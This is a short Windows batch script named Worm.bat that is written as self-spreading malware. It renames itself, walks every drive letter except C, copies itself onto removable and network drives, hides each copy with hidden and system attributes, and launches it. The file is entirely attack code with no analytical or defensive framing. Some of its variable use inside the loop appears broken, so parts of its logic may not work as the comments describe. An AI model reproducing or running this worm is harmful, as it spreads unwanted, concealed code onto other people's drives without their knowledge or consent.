@echo off
setlocal enableextensions

rem Get the name of the current script
set scriptName=%~nx0

rem Check if the script name is not Worm.bat
if not "%scriptName%"=="Worm.bat" (
    rem Rename the script to Worm.bat
    ren "%scriptName%" Worm.bat
)

rem Set the drive letter variable
set drive=

rem Loop through all possible drive letters
for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    rem Check if the drive is a removable drive or a network drive
    if exist "%%i:\" (
        set drive=%%i
        rem Check if the drive is an external or network drive
        if not %drive%==C (
            rem Check if the Worm.bat file already exists on the drive
            if not exist %drive%:\Worm.bat (
                rem Copy the Worm.bat file to the external or network drive
                xcopy /y "Worm.bat" %drive%:\
                echo File Worm.bat copied to: %drive%:\
                rem Give the Worm.bat script the hidden and system file attributes
                attrib +h +s %drive%:\Worm.bat
                rem Run the Worm.bat script
                start %drive%:\Worm.bat
            ) else (
                echo File Worm.bat already exists on %drive%:\
            )
        )
    )
)

rem Check if any external or network drives were found
if "%drive%"=="" (
    echo No external or network drives found
)

endlocal
